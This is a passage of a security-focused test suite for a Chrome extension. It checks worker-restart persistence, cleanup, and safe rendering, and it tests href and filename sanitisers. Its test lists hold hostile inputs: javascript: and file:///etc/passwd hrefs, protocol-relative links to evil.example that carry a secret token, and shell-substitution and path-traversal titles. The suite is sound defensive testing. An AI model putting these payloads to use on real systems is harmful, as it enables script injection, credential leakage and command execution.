  /* THE SECTION THE SKELETON DID NOT HAVE, and the reason every tool built on
     an in-memory Map ships the same bug.

     Chrome kills an MV3 service worker after ~30 seconds idle and after ~5
     minutes of wall clock, WHILE A JOB IS RUNNING. Everything below is what
     happens next, driven with H.restartWorker() — which tears the dead
     instance's listeners down first, because a harness that left them
     registered would answer from the corpse and show a false green.

     Teeth for the whole section: change lib/jobs.js's cache to a plain Map that
     does not persist, and every "survives" check here goes red. */
  await runSection('lifetime', async () => {
    const { chrome, bg } = boot();
    await tick();

    const job = await bg.sandbox.beginJob({ id: 7, windowId: 2 }, 'read-title');
    await tick(4);
    check('a job is in flight, with a scratch row and a session mirror',
      bg.sandbox.SKJOBS.size() === 1 && scratchCount(bg) === 1 &&
      !!chrome.storage.session.__data.get('skJobs'),
      'mirror=' + JSON.stringify(chrome.storage.session.__data.get('skJobs')));

    /* THE PROBE THAT PROVED THE OLD DESIGN BROKEN: kill the worker, bring it
       back against the same chrome and the same IndexedDB. */
    const sw2 = H.restartWorker(bg);
    await sw2.eval('SK_WAKE');
    await tick(6);
    check('THE JOB SURVIVES THE SUSPENSION — the new worker instance sees it',
      sw2.sandbox.SKJOBS.size() === 1 && sw2.sandbox.SKJOBS.get(7) &&
      sw2.sandbox.SKJOBS.get(7).jobId === job.jobId,
      'rehydrated ' + sw2.sandbox.SKJOBS.size() + ' job(s)');
    check('so its scratch is still OWNED, and the wake sweep leaves it alone',
      scratchCount(sw2) === 1, 'scratch=' + scratchCount(sw2));
    check('and closing the tab AFTER the restart still cleans up — the old design could not',
      (sw2.fire('tabs.onRemoved', 7), true) && (await tick(4), sw2.sandbox.SKJOBS.size() === 0 && scratchCount(sw2) === 0),
      'jobs=' + sw2.sandbox.SKJOBS.size() + ' scratch=' + scratchCount(sw2));

    /* THE ORPHAN. Five suspend cycles used to leave five unreachable rows. */
    const { chrome: c2, bg: b2 } = boot();
    await tick();
    const OLD = Date.now() - 60 * 60 * 1000;                 // an hour ago
    await b2.sandbox.SKDB.put('scratch', { k: 'ghost:00000', jobId: 'ghost', startedAt: OLD });
    await b2.sandbox.SKDB.put('scratch', { k: 'ghost:00001', jobId: 'ghost' });      // no timestamp
    const fresh = await b2.sandbox.beginJob({ id: 8, windowId: 1 }, 'read-title');
    await tick(4);
    check('a wake starts with one live job and two rows nobody owns',
      scratchCount(b2) === 3, 'scratch=' + scratchCount(b2));

    const sw3 = H.restartWorker(b2);
    await sw3.eval('SK_WAKE');
    await tick(8);
    const left = sw3.idb.indexedDB.__rows(DB_NAME, 'scratch');
    check('the WAKE sweep deletes the orphans — no browser restart required',
      left.length === 1 && left[0].jobId === fresh.jobId,
      'left: ' + JSON.stringify(left.map(r => r.k)));
    check('an un-datable orphan goes too: a row that cannot be aged cannot be protected by an age rule',
      left.every(r => r.jobId !== 'ghost'), left.length + ' row(s) left');
    check('the sweep is age-AND-ownership, so a LIVE job\'s rows are never collateral',
      sw3.sandbox.SKJOBS.has(8) && left.length === 1, 'the live job kept its row');
    check('the sweep says what it removed, in the log a developer reads',
      /swept 2 orphaned scratch row/.test(sw3.logText()), 'console.warn carries the count');

    /* THE WATCHDOG. Persisting the job table removed the accidental garbage
       collector that suspension used to be, so something has to give a wedged
       job up — otherwise the tab is marked busy for the rest of the session. */
    const { chrome: c3, bg: b3 } = boot();
    await tick();
    const wedged = await b3.sandbox.beginJob({ id: 7, windowId: 2, url: HOSTILE_URL }, 'read-title');
    await tick(4);
    // Age the mirror by hand: this is a job that started before the last three
    // suspensions and is never coming back.
    const stored = c3.storage.session.__data.get('skJobs');
    stored['7'].startedAt = Date.now() - 60 * 60 * 1000;
    await c3.storage.session.set({ skJobs: stored });

    const sw4 = H.restartWorker(b3);
    await sw4.eval('SK_WAKE');
    await tick(8);
    check('the watchdog gives up a job older than JOB_TIMEOUT_MS',
      sw4.sandbox.SKJOBS.size() === 0, 'jobs=' + sw4.sandbox.SKJOBS.size());
    check('and its scratch goes with it, through the SAME abort hook',
      scratchCount(sw4) === 0, 'scratch=' + scratchCount(sw4) + ' (jobId ' + wedged.jobId.slice(0, 8) + '…)');
    const parked = c3.storage.session.__data.get('skLastError');
    check('a timed-out job is given up ON THE RECORD — the user can find out why the badge stopped',
      !!parked && parked.reason === 'reasonTimedOut', JSON.stringify(parked));
    check('the timeout note carries an origin and no path, like every other note',
      !!parked && parked.origin === 'https://bank.example' && JSON.stringify(parked).indexOf(SECRET) < 0,
      parked && parked.origin);

    /* The badge outlives the worker that set it, because the setTimeout that
       would have cleared it did not. */
    check('the wake clears the badge the dead instance left behind',
      sw4.chrome.__callsOf('action.setBadgeText').some(c => c.args[0] && c.args[0].text === ''),
      sw4.chrome.__callsOf('action.setBadgeText').length + ' badge writes since the restart');

    /* THE RACE. A message can be what STARTS the worker, so the router may run
       before the table has been read back. A case that peeked early would see
       an empty table and start a second job in a tab that already has one. */
    const { chrome: c5, bg: b5 } = boot();
    await tick();
    await b5.sandbox.beginJob({ id: 1, windowId: 1 }, 'read-title');
    await tick(4);
    const sw5 = H.restartWorker(b5);
    // NO await on SK_WAKE — the message arrives while the rehydrate is in
    // flight, which is exactly what happens when the message is the wake-up.
    const raced = await sw5.send({ type: 'SK_TAB_INFO', tabId: 1 });
    check('a message that ARRIVES DURING THE WAKE still sees the rehydrated table',
      raced.ok === false && raced.error === 'reasonBusy', JSON.stringify(raced));
    check('the router awaits the wake before any case runs',
      /await SK_WAKE;/.test(H.readRoot('background.js')), 'one await, at the top of the router');

    /* The same race, on the CLEANUP path. Closing a tab can be the event that
       starts the worker, and a listener that ran before the table came back
       would abort nothing and orphan the very rows it exists to remove. */
    const { chrome: c5b, bg: b5b } = boot();
    await tick();
    await b5b.sandbox.beginJob({ id: 1, windowId: 1 }, 'read-title');
    await tick(4);
    const sw5b = H.restartWorker(b5b);
    sw5b.fire('tabs.onRemoved', 1);          // no await on SK_WAKE, on purpose
    await tick(10);
    check('a tab closed DURING the wake still finds its job and drops its scratch',
      sw5b.sandbox.SKJOBS.size() === 0 && scratchCount(sw5b) === 0,
      'jobs=' + sw5b.sandbox.SKJOBS.size() + ' scratch=' + scratchCount(sw5b));
    const waits = (H.readRoot('background.js').match(/await SK_WAKE;/g) || []).length;
    check('every entry point that reads the job table waits for it — the router and all three cleanup listeners',
      waits >= 4, waits + ' await points');

    /* The persisted record is subject to the same rule as the parked note. */
    const { chrome: c6, bg: b6 } = boot();
    await tick();
    await b6.sandbox.beginJob({ id: 7, windowId: 2, url: HOSTILE_URL }, 'read-title');
    await tick(4);
    const wire = JSON.stringify(c6.storage.session.__data.get('skJobs'));
    check('the persisted job record carries an ORIGIN, never the url that made it',
      wire.indexOf(SECRET) < 0 && wire.indexOf("it's") < 0 && wire.indexOf('token=') < 0,
      wire);
    check('the job table lives in storage.session — never local, never sync',
      c6.storage.local.__data.size === 0 && !c6.storage.sync.__data.has('skJobs'),
      c6.storage.local.__data.size + ' local keys, ' + c6.storage.session.__data.size + ' session keys');
    check('the whole in-flight table is ONE key, so one write mirrors all of it',
      Array.from(c6.storage.session.__data.keys()).filter(k => k === 'skJobs').length === 1,
      Array.from(c6.storage.session.__data.keys()).join(','));

    /* RETENTION RUNS ON THE WAKE TOO. The count cap is enforced at write time,
       but an age rule has nothing to hang off: nobody writes a row on the day
       it expires. The wake is the only moment that recurs on its own. */
    const { chrome: c7, bg: b7 } = boot();
    await tick();
    await c7.storage.sync.set({ retentionDays: 7 });
    await b7.sandbox.SKDB.put('items', { id: 'stale', title: 'x', origin: 'https://a.example', createdAt: Date.now() - 30 * 86400000 });
    await b7.sandbox.SKDB.put('items', { id: 'recent', title: 'y', origin: 'https://a.example', createdAt: Date.now() - 3600000 });
    await tick(4);
    const sw7 = H.restartWorker(b7);
    await sw7.eval('SK_WAKE');
    await tick(8);
    const survivors = sw7.idb.indexedDB.__rows(DB_NAME, 'items').map(r => r.id);
    check('the wake applies the user\'s retention setting — an age rule needs a recurring moment, and this is it',
      survivors.length === 1 && survivors[0] === 'recent', 'left: ' + survivors.join(','));

    /* No step of the wake may throw: it is awaited by every entry point, so a
       rejection would take the whole worker down with it. */
    const { chrome: c8, bg: b8 } = boot();
    await tick();
    c8.storage.session.__data.set('skJobs', 'not an object at all');
    c8.__failOnce('storage.sync.get', new Error('storage is unavailable'));
    const sw8 = H.restartWorker(b8);
    let wakeThrew = false;
    try { await sw8.eval('SK_WAKE'); } catch (_) { wakeThrew = true; }
    await tick(8);
    check('a corrupt job mirror and a failing settings read do NOT reject the wake',
      !wakeThrew && sw8.sandbox.SKJOBS.size() === 0, wakeThrew ? 'the wake rejected' : 'recovered to an empty table');
    const stillWorks = await sw8.send({ type: 'SK_TAB_INFO', tabId: 1 });
    check('and the worker still answers afterwards',
      stillWorks.ok === true, JSON.stringify(stillWorks.error || 'ok'));

    /* The rule, stated as a static check so a tool cannot quietly go back. */
    const bgSrc = H.readRoot('background.js');
    check('background.js keeps NO job state in a bare Map or Set of its own',
      !/\b(const|let|var)\s+\w*[Jj]obs?\w*\s*=\s*new\s+(Map|Set)\b/.test(bgSrc),
      'the only job table is SKJOBS');
    check('every mutation of the job table writes through to storage',
      /persist\(\);/.test(H.readRoot('lib/jobs.js')) &&
      (H.readRoot('lib/jobs.js').match(/persist\(\);/g) || []).length >= 3,
      (H.readRoot('lib/jobs.js').match(/persist\(\);/g) || []).length + ' write-through points (set, delete, clear)');
  });

  await runSection('render', async () => {
    const chrome = H.makeChrome({
      tabs: [{ id: 1, windowId: 1, active: true, title: HOSTILE_TITLE, url: HOSTILE_URL }]
    });
    const bg = H.loadBackground({ chrome });
    const dom = H.makeDom({ html: ['popup/popup.html'] });
    const page = H.loadPage(['lib/settings.js', 'pages/common.js', 'popup/popup.js'],
      { chrome, idb: bg.idb, dom });
    await tick(12);

    check('the popup found every element popup.html declares',
      ['err', 'errText', 'title', 'origin', 'copyBtn', 'errDismiss', 'refreshBtn', 'themeBtn', 'optionsLink']
        .every(id => dom.$(id)), dom.seeded.map(s => s.id).join(','));

    check('the hostile page title round-trips as TEXT, byte for byte',
      dom.$('title').textContent === HOSTILE_TITLE, JSON.stringify(dom.$('title').textContent).slice(0, 80) + '…');
    check('ZERO elements were created inside #title',
      dom.$('title').countElements() === 0, dom.$('title').countElements() + ' child elements');
    check('ZERO markup sinks were written during the whole popup boot',
      dom.markupWrites.length === 0, dom.markupWrites.length + ' innerHTML/outerHTML/insertAdjacentHTML writes');
    check('document.title was not touched by the payload',
      dom.document.title === '', JSON.stringify(dom.document.title));

    check('the popup shows the ORIGIN, never the path or the token',
      dom.$('origin').textContent === 'https://bank.example', dom.$('origin').textContent);
    check('nothing rendered anywhere in the popup contains the token',
      dom.body.textContent.indexOf(SECRET) < 0, 'body text is clean');

    check('the copy button is enabled once there is something to copy',
      dom.$('copyBtn').disabled === false, 'disabled=' + dom.$('copyBtn').disabled);
    dom.$('copyBtn').click();
    await tick(4);
    check('copy sends the title through the clipboard API as a VALUE',
      dom.clipboardWrites.length === 1 && dom.clipboardWrites[0] === HOSTILE_TITLE,
      dom.clipboardWrites.length + ' write(s)');
    check('the toast is built with createElement + textContent',
      dom.$('sk-toast') && dom.$('sk-toast').textContent === 'Copied' && dom.markupWrites.length === 0,
      dom.$('sk-toast') ? dom.$('sk-toast').textContent : 'no toast');

    /* The error surface, rendering a sentence that came off the wire. */
    page.sandbox.renderInfo({ ok: false, error: 'reasonBusy' });
    check('an error answer shows the error box and disables copy',
      dom.$('err').hidden === false && dom.$('copyBtn').disabled === true,
      'hidden=' + dom.$('err').hidden);
    check('the error text is rendered as text',
      dom.$('errText').textContent === 'This tab is already busy.' && dom.$('errText').countElements() === 0,   // the KEY resolved through the catalogue
      dom.$('errText').textContent);

    /* renderInfo is shipped code, top-level, callable — no test-only hook. */
    page.sandbox.renderInfo({ ok: true, title: '</span><script>x</script>', origin: 'https://a.example' });
    check('a closing tag in a title still becomes text, not an element',
      dom.$('title').textContent === '</span><script>x</script>' && dom.$('title').countElements() === 0,
      dom.$('title').textContent);
    check('a successful answer hides the error box', dom.$('err').hidden === true, String(dom.$('err').hidden));

    /* The parked note, read back and rendered ON THE TAB IT CAME FROM. */
    await bg.sandbox.recordError('read-title', HOSTILE_MSG, { id: 1, url: HOSTILE_URL });
    page.eval('answeredOk = false');
    await page.sandbox.showLastError(1);
    await tick(4);
    const shown = dom.$('errText').textContent;
    check('the parked note renders as one readable sentence with its origin',
      shown === 'Last title read failed — Something stopped this before it finished. Please try again. (https://bank.example)',
      shown);
    check('the rendered note carries no token and no path',
      shown.indexOf(SECRET) < 0 && shown.indexOf("it's") < 0, 'clean');

    /* TWO BOUNDS ON DISCLOSURE, NOT ONE ON STORAGE.

       storage.session settles how long the note is KEPT. These settle how long
       it is SHOWN and to whom, which are different questions and are the ones
       that make a scheme+host disclosure matter: a failure on an intranet host
       at 09:00 that is still on screen at 16:00, over an unrelated tab, in
       front of a screen share. A stale note never produces a bug report, so
       nothing would ever prompt anyone to notice. */
    page.eval('answeredOk = false');
    await page.sandbox.showLastError(9);        // a DIFFERENT tab is in front now
    await tick(4);
    const otherTab = dom.$('errText').textContent;
    check('a note from ANOTHER tab keeps its sentence and loses its host',
      otherTab.indexOf('bank.example') < 0 && otherTab.indexOf('Last title read failed') === 0,
      otherTab);
    check('and the note itself is left alone — it is still the right answer for its own tab',
      chrome.storage.session.__data.has(bg.eval('LAST_ERROR_KEY')), 'still parked');

    /* Age it past the TTL by rewriting `when` — the same thing the clock does,
       without waiting ten minutes. */
    const ttl = bg.eval('SK_NOTE_TTL_MS');
    check('the popup and the worker declare the SAME note TTL',
      ttl === page.eval('SK_NOTE_TTL_MS'), ttl + ' ms in both files');
    const stale = Object.assign({}, chrome.storage.session.__data.get(bg.eval('LAST_ERROR_KEY')));
    stale.when = Date.now() - ttl - 1000;
    await chrome.storage.session.set({ [bg.eval('LAST_ERROR_KEY')]: stale });
    page.eval('answeredOk = false');
    dom.$('err').hidden = true;
    await page.sandbox.showLastError(1);
    await tick(4);
    check('a note older than the TTL is NOT shown, on its own tab or any other',
      dom.$('err').hidden === true, 'hidden=' + dom.$('err').hidden);
    check('and it is DELETED rather than merely skipped, so it cannot come back',
      !chrome.storage.session.__data.has(bg.eval('LAST_ERROR_KEY')),
      chrome.storage.session.__data.size + ' session keys');

    // Re-park a fresh one so the dismiss checks below still have something.
    await bg.sandbox.recordError('read-title', HOSTILE_MSG, { id: 1, url: HOSTILE_URL });
    page.eval('answeredOk = false');
    await page.sandbox.showLastError(1);
    await tick(4);
    dom.$('errDismiss').click();
    await tick(2);
    check('dismissing the note hides it AND deletes it',
      dom.$('err').hidden === true && !chrome.storage.session.__data.has(bg.eval('LAST_ERROR_KEY')),
      chrome.storage.session.__data.size + ' session keys');

    /* THE CLIPBOARD FALLBACK LEAVES NOTHING BEHIND.

       When the async clipboard is refused, skCopyText builds a <textarea>
       holding the very text the user asked to copy — which in this family is
       page-derived and is usually the sensitive thing on screen. The removal
       used to sit on the success line, so an execCommand that THREW left that
       node in the DOM of a page that can live for hours. try/finally. */
    const domCb = H.makeDom({ html: ['popup/popup.html'], clipboardFails: true, execCommandResult: false });
    const pageCb = H.loadPage(['lib/settings.js', 'pages/common.js'], { chrome, dom: domCb });
    const bodyBefore = domCb.body.children.length;
    const copied = await pageCb.sandbox.skCopyText('secret-' + SECRET);
    check('a refused async clipboard falls back to the textarea path',
      domCb.execCommandCalls.length === 1 && copied === false,
      domCb.execCommandCalls.join(',') + ' -> ' + copied);
    check('and the fallback textarea is REMOVED even when the fallback fails',
      domCb.body.children.length === bodyBefore &&
      domCb.body.find('textarea').length === 0 &&
      domCb.body.textContent.indexOf(SECRET) < 0,
      domCb.body.find('textarea').length + ' textarea(s) left in the page');
    check('skCopyText removes the node in a finally, not on the success line',
      /finally \{[\s\S]{0,120}?ta\.remove\(\)/.test(H.readRoot('pages/common.js')),
      'try/finally');

    /* pages/common.js: the href allowlist. Default deny, and a refusal renders
       as a span so the text is still shown. */
    const el = page.sandbox;
    const REFUSE = ['javascript:alert(1)', 'JavaScript:alert(1)', ' javascript:alert(1)', 'java\tscript:alert(1)',
      'data:text/html,<script>x</script>', 'blob:https://a.example/x', 'vbscript:x', 'file:///etc/passwd',
      'chrome://settings', 'https://a.example/<img>', 'https://a.example/"onmouseover="x', 'https://a.example/ x',
      'https://a.example/' + String.fromCharCode(0),
      'https://a.example/' + String.fromCharCode(1) + 'x',
      'https://a.example/x' + String.fromCharCode(127),
      '\njavascript:alert(1)'];
    let admitted = null;
    for (const h of REFUSE) if (el.skSafeHref(h) !== '') { admitted = h; break; }
    check(REFUSE.length + ' dangerous href shapes are ALL refused', admitted === null, admitted ? 'admitted ' + JSON.stringify(admitted) : 'default deny holds');

    const ALLOW = ['https://example.com/a/b?q=1#f', 'http://example.com', 'options.html', 'pages/options.html#about'];
    let refused = null;
    for (const h of ALLOW) if (el.skSafeHref(h) === '') { refused = h; break; }
    check('ordinary http(s) and in-extension relative hrefs are allowed', refused === null, refused ? 'refused ' + refused : ALLOW.length + '/' + ALLOW.length);

    /* skSafeHref trims BEFORE it tests, so surrounding whitespace is whitespace
       and not a bypass. Worth pinning in both directions: a trailing space on a
       good url must survive, and a leading space in front of javascript: must
       not save it. (Found by a red: a trailing space was in the REFUSE list by
       mistake, and it is not an attack — trim() had already dealt with it.) */
    check('surrounding whitespace is trimmed, so a good url with a trailing space still works',
      el.skSafeHref('  https://example.com/x  ') === 'https://example.com/x',
      JSON.stringify(el.skSafeHref('  https://example.com/x  ')));
    check('trimming does not rescue a bad scheme hiding behind a leading space',
      el.skSafeHref('   javascript:alert(1)') === '', 'refused');

    /* The property behind that list, over a generated space: whatever survives
       the allowlist may name http or https, or no scheme at all. Nothing else.
       This is the check that bites if the allowlist is ever loosened — a new
       shape that slips through is caught here even if nobody adds it to REFUSE.
       The control characters are built from char codes so that what is in this
       file and what the test sends are the same thing. */
    const TAB = String.fromCharCode(9), NL = String.fromCharCode(10), NUL = String.fromCharCode(0);
    const SCHEME_FUZZ = [];
    for (const s of ['javascript', 'JAVASCRIPT', 'java' + TAB + 'script', 'java' + NL + 'script',
      'java' + NUL + 'script', 'data', 'blob', 'vbscript', 'file', 'chrome', 'chrome-extension',
      'moz-extension', 'about', 'view-source', 'ws', 'wss', 'ftp', 'intent', 'mailto', 'tel', 'jar',
      'https' + TAB, ' https', 'HTTPS']) {
      for (const tail of [':alert(1)', '://a.example/x', ':' + HOSTILE_TITLE, '://a.example/?t=' + SECRET]) {
        SCHEME_FUZZ.push(s + tail);
      }
    }
    let slipped = null;
    for (const h of SCHEME_FUZZ) {
      const out = el.skSafeHref(h);
      if (out === '') continue;
      if (!/^https?:\/\//i.test(out)) { slipped = JSON.stringify(h) + ' -> ' + JSON.stringify(out); break; }
    }
    check(SCHEME_FUZZ.length + ' scheme shapes: anything the allowlist admits is http(s) or names no scheme at all',
      slipped === null, slipped || 'no executable and no non-web scheme survives');

    /* CLOSED — this used to be a KNOWN GAP with a paragraph explaining why it
       was acceptable, and the paragraph was the damage. `//host/path` names no
       scheme, so it passed the relative-path branch of SK_RELATIVE_HREF. On an
       extension page it resolves against chrome-extension: and reaches nothing,
       which is what the paragraph said. But the moment a tool renders a link
       inside a CONTENT SCRIPT — on an https: page, which is where in-page
       overlays live — the same helper hands back a working open redirect whose
       visible text the attacker also chose. Two characters, checked first. */
    const PROTO_REL = ['//evil.example/x?t=' + SECRET, '\\\\evil.example/x', '  //evil.example/',
      '//evil.example', '///evil.example/x'];
    let leaked = null;
    for (const h of PROTO_REL) if (el.skSafeHref(h) !== '') { leaked = h + ' -> ' + el.skSafeHref(h); break; }
    check(PROTO_REL.length + ' protocol-relative shapes are refused outright — no scheme is not the same as no risk',
      leaked === null, leaked || 'all refused');

    const badLink = el.elLink('click me', 'javascript:alert(1)');
    check('a refused href renders as a SPAN, not an anchor',
      badLink.tagName === 'SPAN' && badLink.textContent === 'click me' && !badLink.href, badLink.tagName);
    const goodLink = el.elLink('docs', 'https://example.com/docs');
    check('an allowed href renders as an anchor with rel=noopener noreferrer',
      goodLink.tagName === 'A' && goodLink.href === 'https://example.com/docs' && goodLink.rel === 'noopener noreferrer',
      goodLink.tagName + ' rel=' + goodLink.rel);

    /* Filenames: a page title is untrusted, and a download path is a filesystem. */
    const fn = el.skBuildFilename('{title}-{host}-{date}', {
      title: '../../../etc/passwd ' + String.fromCharCode(0) + '\r\n<script>', origin: 'https://www.evil.example', ext: '.png'
    });
    check('a hostile title cannot put a path separator in a filename',
      fn.indexOf('/') < 0 && fn.indexOf('\\') < 0, fn);
    check('a hostile title cannot put a control character or a colon in a filename',
      !/[\x00-\x1f:<>"|?*]/.test(fn), JSON.stringify(fn));
    check('the filename cannot start with a dot or a dash',
      !/^[.\-]/.test(fn), fn);
    check('www. is stripped from the host token', fn.indexOf('www.') < 0 && fn.indexOf('evil.example') >= 0, fn);

    /* ================================================================
       THE FILENAME ALLOWLIST — the one place untrusted text meets a
       filesystem, and the one place the house rule was broken in the
       house's own code.
       ================================================================
       The three checks above are DENYLIST checks: they name characters that
       must be absent, which is the same mistake as the sanitiser they were
       grading. They stay, because they document the specific cases that were
       feared. What follows is the property that actually holds.

       THE PROPERTY: for every input, the output character set is a subset of
       the declared allowlist. That is provable by fuzzing; "no colon appeared"
       is not. */
    const ALLOWED = /^[A-Za-z0-9._-]*$/;
    const NASTY = [
      '\u202Egnp.exe', '\u200Bzero\u200Fwidth', '\u2066isolate\u2069',
      '\u0085next\u009Fline', '\u007Fdel', 'CON', 'nul.txt', 'LPT9',
      'a'.repeat(400), '😀'.repeat(120), '한'.repeat(120), 'ばか', 'ना\u0941',
      '../../etc/passwd', 'C:\\Windows\\System32', 'a\tb\nc\rd', '   ',
      '.....', '---', '$(rm -rf ~)', '`whoami`', '%2e%2e%2f', 'a\u0000b',
      String.fromCharCode(0x1F) + 'x', 'файл', 'ملف', '\uD800lone', 'x\uDFFFy'
    ];
    /* Generated cases as well as chosen ones: a hand-picked list only ever
       finds the characters somebody already thought of, which is precisely how
       both of this family's earlier sanitisers were beaten. */
    for (let i = 0; i < 400; i++) {
      let s = '';
      for (let j = 0; j < 12; j++) s += String.fromCodePoint(1 + Math.floor(Math.random() * 0x2FFF));
      NASTY.push(s);
    }
    let escaped = null, tooLong = null, device = null;
    for (const t of NASTY) {
      const out = el.skBuildFilename('{title}', { title: t, ext: '.png' });
      const stem = out.slice(0, -4);
      if (!ALLOWED.test(stem)) { escaped = JSON.stringify(t) + ' -> ' + JSON.stringify(out); break; }
      if (Buffer.byteLength(out, 'utf8') > 220) { tooLong = out.length + ' chars / ' + Buffer.byteLength(out, 'utf8') + ' bytes'; break; }
      if (page.eval('SK_DEVICE_NAMES').indexOf(stem.toUpperCase().split('.')[0]) >= 0) { device = out; break; }
    }
    check(NASTY.length + ' hostile titles, and EVERY output is inside the declared allowlist',
      escaped === null, escaped || '[A-Za-z0-9._-] only, every time');
    check('including U+202E and the zero-width marks — the download-name spoof, not just a display bug',
      el.skBuildFilename('{title}', { title: 'report\u202Egnp.exe' }).indexOf('\u202E') < 0,
      JSON.stringify(el.skBuildFilename('{title}', { title: 'report\u202Egnp.exe' })));
    check('no output exceeds the filesystem BYTE limit, whatever alphabet it was in',
      tooLong === null, tooLong || 'every name fits in ' + page.eval('SK_NAME_MAX_BYTES') + ' bytes + extension');
    /* AND IT IS BYTES, NOT CHARACTERS.

       MISSED ON THE FIRST TEETH RUN: replacing skClipBytes with `.slice(0, 60)`
       changed nothing above, because after the allowlist every surviving
       character is one ASCII byte and the two measures coincide. The check was
       true by construction, not because byte-counting was being done.

       Where the distinction is real is skClipBytes itself — which is the
       function a tool depends on the moment it WIDENS SK_NAME_ALLOWED to keep
       CJK or accented letters in a filename, which is a legitimate thing to
       want. So it is tested directly, on input where a character is not a byte:
       ~255 bytes is the limit almost every filesystem enforces, and sixty CJK
       characters are 180 bytes before the rest of the template. */
    const clip = (s, n) => page.sandbox.skClipBytes(s, n);
    const cjk = '한'.repeat(100);                       // 3 bytes each
    const emoji = '😀'.repeat(100);                     // 4 bytes each
    check('skClipBytes cuts on BYTES — 100 three-byte characters do not fit in 60 bytes',
      Buffer.byteLength(clip(cjk, 60), 'utf8') === 60 && Array.from(clip(cjk, 60)).length === 20,
      Buffer.byteLength(clip(cjk, 60), 'utf8') + ' bytes / ' + Array.from(clip(cjk, 60)).length + ' characters');
    check('and it never cuts a character in half — no lone surrogate, ever',
      !/[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?:^|[^\uD800-\uDBFF])[\uDC00-\uDFFF]/.test(clip(emoji, 61)) &&
      Buffer.byteLength(clip(emoji, 61), 'utf8') === 60,
      '61-byte budget, 4-byte characters -> ' + Buffer.byteLength(clip(emoji, 61), 'utf8') + ' bytes, no half character');
    check('a string already inside the budget is returned untouched',
      clip('Q4_Report', 200) === 'Q4_Report', clip('Q4_Report', 200));
    check('and skBuildFilename measures with THAT function, not with .length',
      /skClipBytes\(name, SK_NAME_MAX_BYTES\)/.test(stripJsComments(H.readRoot('pages/common.js'))),
      'the pipeline is allowlist -> collapse -> skClipBytes -> device-name check');
    check('a title that is a Windows DEVICE NAME never becomes one',
      device === null && el.skBuildFilename('{title}', { title: 'NUL', ext: '.png' }) !== 'NUL.png',
      el.skBuildFilename('{title}', { title: 'NUL', ext: '.png' }));
    check('the device list is a declared ARRAY compared exactly, never a pattern',
      Array.isArray(page.eval('SK_DEVICE_NAMES')) && page.eval('SK_DEVICE_NAMES').length === 22,
      page.eval('SK_DEVICE_NAMES').length + ' names');
    check('an empty result falls back to a fixed name rather than to the extension alone',
      el.skBuildFilename('{title}', { title: '\u202E\u200B  ', ext: '.png' }) === 'file.png',
      el.skBuildFilename('{title}', { title: '\u202E\u200B  ', ext: '.png' }));
    check('and an ordinary title still reads like itself — the allowlist is not a hash',
      el.skBuildFilename('{title}', { title: 'Q4 Report v2.1', ext: '.csv' }) === 'Q4_Report_v2.1.csv',
      el.skBuildFilename('{title}', { title: 'Q4 Report v2.1', ext: '.csv' }));
    check('pages/common.js reduces the name with an ALLOWLIST, not a character class of bad characters',
      /\[\^A-Za-z0-9._-\]/.test(stripJsComments(H.readRoot('pages/common.js'))) &&
      !/replace\(\/\[<>:"/.test(stripJsComments(H.readRoot('pages/common.js'))),
      'SK_NAME_ALLOWED — negated set, keep-list semantics');

    check('nothing in the page contexts touched the network',
      page.net.length === 0 && bg.net.length === 0, page.net.length + bg.net.length + ' attempts');
  });

  await runSection('render/options', async () => {
    const chrome = H.makeChrome({ tabs: [{ id: 1, windowId: 1, active: true, title: 'x', url: 'https://a.example/' }] });
    const bg = H.loadBackground({ chrome });

    /* REAL timestamps, minutes old. They used to be 1 and 2 — i.e. January 1970
       — which was harmless until retention existed and then silently deleted
       one of the fixture rows on the way in. A fixture whose dates are not
       plausible is a fixture that cannot be used to test anything dated. */
    const NOW = Date.now();
    await bg.sandbox.SKDB.put('items', { id: 'a1', title: HOSTILE_TITLE, origin: 'https://bank.example', createdAt: NOW - 120000 });
    await bg.sandbox.SKDB.put('items', { id: 'a2', title: 'ordinary', origin: 'https://ok.example', createdAt: NOW - 240000 });
    await tick();

    const dom = H.makeDom({ html: ['pages/options.html'] });
    const page = H.loadPage(['lib/settings.js', 'lib/storage.js', 'pages/common.js', 'pages/options.js'],
      { chrome, idb: bg.idb, dom });
    check('the options controller waits for DOMContentLoaded', dom.hasReadyHandler(), 'registered');
    await dom.ready();
    await tick(12);

    check('the version comes from the manifest, not from a literal',
      dom.$('version').textContent === 'v' + JSON.parse(H.readRoot('manifest.json')).version,
      dom.$('version').textContent);
    check('settings are loaded into the real form controls',
      dom.$('theme').value === 'system' && dom.$('historyLimit').value === bg.sandbox.SK_DEFAULTS.historyLimit &&
      dom.$('keepHistory').checked === false,
      'theme=' + dom.$('theme').value + ' limit=' + dom.$('historyLimit').value);

    check('the "Your data" list shows every stored row',
      dom.$('itemList').children.length === 2, dom.$('itemList').children.length + ' rows');
    check('a hostile stored title renders as TEXT in the list',
      dom.$('itemList').textContent.indexOf(HOSTILE_TITLE) >= 0 &&
      dom.$('itemList').find('img').length === 0,
      dom.$('itemList').find('img').length + ' img elements');
    check('ZERO markup sinks were written by the options page',
      dom.markupWrites.length === 0, dom.markupWrites.length + ' writes');
    check('the summary tells the user what is stored and where',
      /2 rows are stored on this device/.test(dom.$('dataSummary').textContent), dom.$('dataSummary').textContent);

    /* Clamps: the widget's min/max is advice, the code is the rule — a user with
       devtools edits the widget, not the code. The real 350 ms debounce has to
       elapse, so this waits on the clock rather than on the microtask queue. */
    dom.$('historyLimit').value = '999999';
    dom.$('historyLimit').__fire('input');
    await sleep(420); await tick(10);
    check('an out-of-range history limit is clamped in CODE, not by the widget',
      chrome.storage.sync.__data.get('historyLimit') === 1000,
      String(chrome.storage.sync.__data.get('historyLimit')));
    dom.$('historyLimit').value = '-5';
    dom.$('historyLimit').__fire('input');
    await sleep(420); await tick(10);
    check('a negative history limit is clamped to at least 1',
      chrome.storage.sync.__data.get('historyLimit') === 1,
      String(chrome.storage.sync.__data.get('historyLimit')));
    dom.$('historyLimit').value = 'not a number';
    dom.$('historyLimit').__fire('input');
    await sleep(420); await tick(10);
    check('a non-numeric history limit falls back to a usable value, never 0 or NaN',
      chrome.storage.sync.__data.get('historyLimit') > 0,
      String(chrome.storage.sync.__data.get('historyLimit')));
    const setsBefore = chrome.__callsOf('storage.sync.set').length;
    for (let i = 0; i < 8; i++) { dom.$('historyLimit').value = String(10 + i); dom.$('historyLimit').__fire('input'); }
    await sleep(420); await tick(10);
    const setsAfter = chrome.__callsOf('storage.sync.set').length;
    check('a rapid burst of 8 edits debounces into ONE write',
